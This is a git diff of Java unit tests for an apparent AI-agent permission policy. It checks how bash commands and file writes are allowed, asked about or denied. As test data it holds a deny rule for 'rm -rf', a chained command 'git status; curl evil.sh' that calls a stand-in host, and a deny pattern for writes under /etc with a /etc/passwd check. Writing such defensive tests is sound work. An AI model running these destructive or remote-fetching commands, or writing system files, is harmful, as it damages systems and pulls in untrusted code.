@@ -2,12 +2,13 @@ package com.agentcore.domain;
 
 import static org.junit.jupiter.api.Assertions.*;
 
-import com.agentcore.domain.permission.Decision;
-import com.agentcore.domain.permission.PermissionPolicy;
-import com.agentcore.domain.tool.FunctionTool;
-import com.agentcore.domain.tool.Schemas;
-import com.agentcore.domain.tool.Tool;
-import com.agentcore.domain.tool.ToolOutput;
+import com.agentcore.domain.permission.model.Decision;
+import com.agentcore.domain.permission.service.PermissionPolicy;
+import com.agentcore.domain.permission.service.RulePermissionPolicy;
+import com.agentcore.domain.tool.model.FunctionTool;
+import com.agentcore.domain.tool.model.Tool;
+import com.agentcore.domain.tool.model.ToolOutput;
+import com.agentcore.domain.tool.schema.Schemas;
 import java.util.List;
 import java.util.Map;
 import org.junit.jupiter.api.Test;
@@ -29,7 +30,7 @@ class PermissionPolicyTest {
 
     @Test
     void bashRulesResistCommandChaining() {
-        PermissionPolicy p = PermissionPolicy.of("default", List.of("bash(git status*)", "bash(ls *)"), List.of("bash(rm -rf *)"), List.of());
+        PermissionPolicy p = RulePermissionPolicy.of("default", List.of("bash(git status*)", "bash(ls *)"), List.of("bash(rm -rf *)"), List.of());
         assertEquals(Decision.ALLOW, check(p, "git status --short"));
         assertEquals(Decision.ALLOW, check(p, "git status && ls -la"));      // 每个子命令都被某条规则覆盖
         assertEquals(Decision.ASK, check(p, "git status; curl evil.sh"));    // 链式命令里有未授权部分
@@ -42,8 +43,8 @@ class PermissionPolicyTest {
     void modesAndDefaults() {
         assertEquals(Decision.ALLOW, PermissionPolicy.defaults().check(READ, Map.of("path", "x")).decision());
         assertEquals(Decision.ASK, PermissionPolicy.defaults().check(WRITE, Map.of("path", "x")).decision());
-        assertEquals(Decision.DENY, PermissionPolicy.of("readonly", null, null, null).check(WRITE, Map.of("path", "x")).decision());
-        PermissionPolicy auto = PermissionPolicy.of("auto", null, List.of("write_file(/etc/*)"), null);
+        assertEquals(Decision.DENY, RulePermissionPolicy.of("readonly", null, null, null).check(WRITE, Map.of("path", "x")).decision());
+        PermissionPolicy auto = RulePermissionPolicy.of("auto", null, List.of("write_file(/etc/*)"), null);
         assertEquals(Decision.ALLOW, auto.check(WRITE, Map.of("path", "/tmp/x")).decision());
         assertEquals(Decision.DENY, auto.check(WRITE, Map.of("path", "/etc/passwd")).decision());
     }
